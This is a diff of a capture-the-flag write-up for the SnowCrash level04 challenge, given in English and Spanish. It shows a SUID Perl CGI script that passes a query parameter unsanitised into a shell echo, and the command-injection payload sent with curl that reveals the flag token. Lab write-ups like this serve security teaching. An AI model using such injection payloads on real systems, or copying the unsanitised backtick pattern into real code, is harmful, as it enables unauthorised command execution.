@@ -1,23 +1,30 @@
-when we start the level we get 
+# Flag 04
+
+## Tools Used:
+
+* `ls` command
+* `curl`
+* Basic understanding of CGI scripting and command injection
+
+## Process:
+
+Upon accessing the `level04` account, listing the files reveals an executable Perl script:
 
 ```bash
 level04@SnowCrash:~$ ls -la
-total 16
-dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
-d--x--x--x  1 root    users    340 Aug 30  2015 ..
--r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
--r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
--rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
--r-x------  1 level04 level04  675 Apr  3  2012 .profile
 ```
 
-the 's' in the execute permitions means that when running the level04.pl script
-it is actually run as the user flag04 
+Key file:
 
-checking the code
+```
+-rwsr-sr-x 1 flag04  level04  152 Mar  5  2016 level04.pl
+```
+
+The presence of the **SUID** bit means this script will run with `flag04`’s privileges.
+
+Inspecting the script:
 
 ```perl
-level04@SnowCrash:~$ cat level04.pl 
 #!/usr/bin/perl
 # localhost:4747
 use CGI qw{param};
@@ -29,17 +36,92 @@ sub x {
 x(param("x"));
 ```
 
-we see that this is a CGI (Common Gate Interface running at port 4747) we see a
-similar structure that on last problems showing an echo we see that the first
-parameter to the function is given to the variable "y" then that variable is
-shown as echo finally this subrutine is run calling for the param("x")
-(meaning the x  variable in the query string)
+### Key observations:
 
-so the strategy here is to call a subshell in the variable y so ideally 
-$(getflag) to do this (and consider expansions in shell) we run the following 
-command 
+1. The script is a **CGI** script running on **localhost:4747**.
+2. The value of the `x` parameter in the query string is passed to an `echo` command without sanitization.
+
+### Exploitation:
+
+We can inject a command by using shell expansion inside the parameter. The following command uses `curl` to send the malicious query:
 
 ```bash
 level04@SnowCrash:~$ curl localhost:4747?x='"$(getflag)"'
+```
+
+The response reveals the flag:
+
+```
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+```
+
+---
+
+# Flag 04
+
+## Herramientas Utilizadas:
+
+* Comando `ls`
+* `curl`
+* Conocimientos básicos de CGI y de inyección de comandos
+
+## Proceso:
+
+Al acceder a la cuenta `level04`, al listar los archivos se encuentra un script Perl ejecutable:
+
+```bash
+level04@SnowCrash:~$ ls -la
+```
+
+Archivo clave:
+
+```
+-rwsr-sr-x 1 flag04  level04  152 Mar  5  2016 level04.pl
+```
+
+La presencia del bit **SUID** significa que este script se ejecuta con los privilegios de `flag04`.
+
+Inspeccionando el código:
+
+```perl
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+```
+
+### Observaciones clave:
+
+1. El script es un **CGI** que corre en **localhost:4747**.
+2. El valor del parámetro `x` se pasa directamente a un comando `echo` sin validación.
+
+### Explotación:
+
+Podemos inyectar un comando usando expansión de shell dentro del parámetro. El siguiente comando envía la petición maliciosa:
+
+```bash
+level04@SnowCrash:~$ curl localhost:4747?x='"$(getflag)"'
+```
+
+La respuesta nos devuelve la flag:
+
+```
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+```
+
+---
+
+## Scripts Used:
+
+None
+
+## Flag:
+
+```
+ne2searoevaevoem4ov4ar8ap
 ```
